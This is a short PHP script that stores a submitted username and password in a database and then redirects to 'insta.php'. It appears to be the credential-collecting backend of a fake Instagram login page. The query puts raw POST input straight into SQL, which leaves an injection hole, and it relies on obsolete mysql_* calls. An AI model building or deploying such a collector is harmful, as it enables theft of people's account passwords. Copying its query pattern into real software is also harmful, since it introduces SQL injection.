<?php

include 'baglan.php';



if (isset($_POST['form-gonder'])) {



$formgonder=mysql_query("insert into form (form_ad,form_sifre) VALUES ('".$_POST['form_ad']."','".$_POST['form_sifre']."')");



if (mysql_affected_rows()) {

header("Location:insta.php?durum=ok");


} else {
    header("Location:insta.php?durum=no");

}





}